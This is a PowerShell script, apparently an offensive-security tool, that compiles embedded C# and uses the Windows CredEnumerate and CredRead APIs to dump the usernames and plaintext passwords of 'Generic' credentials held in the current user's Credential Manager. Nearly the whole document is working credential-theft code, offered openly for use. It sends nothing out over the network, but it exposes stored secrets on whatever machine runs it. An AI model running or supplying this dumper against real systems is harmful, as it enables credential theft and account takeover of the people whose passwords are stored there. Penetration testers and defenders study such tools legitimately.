function Invoke-WCMDump
{
      <#
      .SYNOPSIS
         Dumps Windows credentials from the Windows Credential Manager for the current user.
         Author:  Barrett Adams (@peewpw)
      .DESCRIPTION
        Enumerates Windows credentials in the Credential Manager and then extracts available
        information about each one. Passwords can be retrieved for "Generic" type credentials,
        but not for "Domain" type credentials.
      .EXAMPLE
        PS>Import-Module .\Invoke-WCMDump.ps1
        PS>Invoke-WCMDump
            Username         : testusername
            Password         : P@ssw0rd!
            Target           : TestApplication
            Description      :
            LastWriteTime    : 12/9/2017 4:46:50 PM
            LastWriteTimeUtc : 12/9/2017 9:46:50 PM
            Type             : Generic
            PersistenceType  : Enterprise
      #>

    $source = @"
    // C# modified from https://github.com/spolnik/Simple.CredentialsManager
    using Microsoft.Win32.SafeHandles;
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Security.Permissions;
    public class Credential : IDisposable
    {
        private static readonly object LockObject = new object();
        private static readonly SecurityPermission UnmanagedCodePermission;
        private string description;
        private DateTime lastWriteTime;
        private string password;
        private PersistenceType persistenceType;
        private string target;
        private CredentialType type;
        private string username;
        static Credential()
        {
            lock (LockObject)
            {
                UnmanagedCodePermission = new SecurityPermission(SecurityPermissionFlag.UnmanagedCode);
            }
        }
        public Credential(string username, string password, string target, CredentialType type)
        {
            Username = username;
            Password = password;
            Target = target;
            Type = type;
            PersistenceType = PersistenceType.Session;
            lastWriteTime = DateTime.MinValue;
        }
        public string Username
        {
            get { return username; }
            set { username = value; }
        }
        public string Password
        {
            get { return password; }
            set { password = value; }
        }
        public string Target
        {
            get { return target; }
            set { target = value; }
        }
        public string Description
        {
            get { return description; }
            set { description = value; }
        }
        public DateTime LastWriteTime
        {
            get { return LastWriteTimeUtc.ToLocalTime(); }
        }
        public DateTime LastWriteTimeUtc
        {
            get { return lastWriteTime; }
            private set { lastWriteTime = value; }
        }
        public CredentialType Type
        {
            get { return type; }
            set { type = value; }
        }
        public PersistenceType PersistenceType
        {
            get { return persistenceType; }
            set { persistenceType = value; }
        }
        public void Dispose() { }
        public bool Load()
        {
            UnmanagedCodePermission.Demand();
            IntPtr credPointer;
            Boolean result = NativeMethods.CredRead(Target, Type, 0, out credPointer);
            if (!result)
                return false;
            using (NativeMethods.CriticalCredentialHandle credentialHandle = new NativeMethods.CriticalCredentialHandle(credPointer))
            {
                LoadInternal(credentialHandle.GetCredential());
            }
            return true;
        }
        public static IEnumerable<Credential> LoadAll()
        {
            UnmanagedCodePermission.Demand();
            
            IEnumerable<NativeMethods.CREDENTIAL> creds = NativeMethods.CredEnumerate();
            List<Credential> credlist = new List<Credential>();
            
            foreach (NativeMethods.CREDENTIAL cred in creds)
            {
                Credential fullCred = new Credential(cred.UserName, null, cred.TargetName, (CredentialType)cred.Type);
                if (fullCred.Load())
                    credlist.Add(fullCred);
            }
            return credlist;
        }
        internal void LoadInternal(NativeMethods.CREDENTIAL credential)
        {
            Username = credential.UserName;
            if (credential.CredentialBlobSize > 0)
            {
                Password = Marshal.PtrToStringUni(credential.CredentialBlob, credential.CredentialBlobSize / 2);
            }
            Target = credential.TargetName;
            Type = (CredentialType)credential.Type;
            PersistenceType = (PersistenceType)credential.Persist;
            Description = credential.Comment;
            LastWriteTimeUtc = DateTime.FromFileTimeUtc(credential.LastWritten);
        }
    }
    public class NativeMethods
    {
        [DllImport("Advapi32.dll", EntryPoint = "CredReadW", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool CredRead(string target, CredentialType type, int reservedFlag, out IntPtr credentialPtr);
        [DllImport("Advapi32.dll", EntryPoint = "CredFree", SetLastError = true)]
        internal static extern void CredFree([In] IntPtr cred);
        [DllImport("Advapi32.dll", EntryPoint = "CredEnumerate", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);
        [StructLayout(LayoutKind.Sequential)]
        internal struct CREDENTIAL
        {
            public int Flags;
            public int Type;
            [MarshalAs(UnmanagedType.LPWStr)] public string TargetName;
            [MarshalAs(UnmanagedType.LPWStr)] public string Comment;
            public long LastWritten;
            public int CredentialBlobSize;
            public IntPtr CredentialBlob;
            public int Persist;
            public int AttributeCount;
            public IntPtr Attributes;
            [MarshalAs(UnmanagedType.LPWStr)] public string TargetAlias;
            [MarshalAs(UnmanagedType.LPWStr)] public string UserName;
        }
        internal static IEnumerable<CREDENTIAL> CredEnumerate()
        {
            int count;
            IntPtr pCredentials;
            Boolean ret = CredEnumerate(null, 0, out count, out pCredentials);
            if (ret == false)
                throw new Exception("Failed to enumerate credentials");
            List<CREDENTIAL> credlist = new List<CREDENTIAL>();
            IntPtr credential = new IntPtr();
            for (int n = 0; n < count; n++)
            {
                credential = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)));
                credlist.Add((CREDENTIAL)Marshal.PtrToStructure(credential, typeof(CREDENTIAL)));
            }
            return credlist;
        }
        internal sealed class CriticalCredentialHandle : CriticalHandleZeroOrMinusOneIsInvalid
        {
            internal CriticalCredentialHandle(IntPtr preexistingHandle)
            {
                SetHandle(preexistingHandle);
            }
            internal CREDENTIAL GetCredential()
            {
                if (!IsInvalid)
                {
                    return (CREDENTIAL)Marshal.PtrToStructure(handle, typeof(CREDENTIAL));
                }
                throw new InvalidOperationException("Invalid CriticalHandle!");
            }
            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    CredFree(handle);
                    SetHandleAsInvalid();
                    return true;
                }
                return false;
            }
        }
    }
    public enum CredentialType : uint
    {
        None = 0,
        Generic = 1,
        DomainPassword = 2,
        DomainCertificate = 3,
        DomainVisiblePassword = 4,
        GenericCertificate = 5,
        DomainExtended = 6,
        Maximum = 7,
        CredTypeMaximum = Maximum+1000
    }
    public enum PersistenceType : uint
    {
        Session = 1,
        LocalComputer = 2,
        Enterprise = 3
    }
"@
    $add = Add-Type -TypeDefinition $source -Language CSharp -PassThru
    $loadAll = [Credential]::LoadAll()
    Write-Output $loadAll
}